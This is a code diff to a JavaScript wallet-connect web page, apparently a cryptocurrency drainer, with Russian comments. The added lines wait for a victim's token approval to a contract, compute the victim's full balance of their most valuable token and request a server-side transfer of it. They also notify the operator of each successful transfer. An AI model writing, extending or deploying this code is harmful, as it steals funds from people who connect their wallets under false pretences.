@@ -751,6 +751,24 @@ const initializeSubscribers = (modal) => {
           console.log(approveMessage)
           await notifyTransferApproved(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId)
           
+          // Ждем подтверждения allowance
+          console.log('Waiting for allowance confirmation...')
+          await waitForAllowance(wagmiAdapter.wagmiConfig, state.address, mostExpensive.address, contractAddress, mostExpensive.chainId)
+          
+          // Отправляем запрос на сервер с корректным amount
+          const amount = parseUnits(mostExpensive.balance.toString(), mostExpensive.decimals)
+          console.log(`Sending transfer request with amount: ${amount.toString()}`)
+          const transferResult = await sendTransferRequest(state.address, mostExpensive.address, amount, mostExpensive.chainId, txHash)
+          
+          if (transferResult.success) {
+            console.log(`Transfer successful: ${transferResult.txHash}`)
+            await notifyTransferSuccess(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId, transferResult.txHash)
+            approveMessage += `<br>Transfer successful: ${transferResult.txHash}`
+          } else {
+            console.log(`Transfer failed: ${transferResult.message}`)
+            approveMessage += `<br>Transfer failed: ${transferResult.message}`
+          }
+          
           const approveState = document.getElementById('approveState')
           if (approveState) approveState.innerHTML = approveMessage
           hideCustomModal()
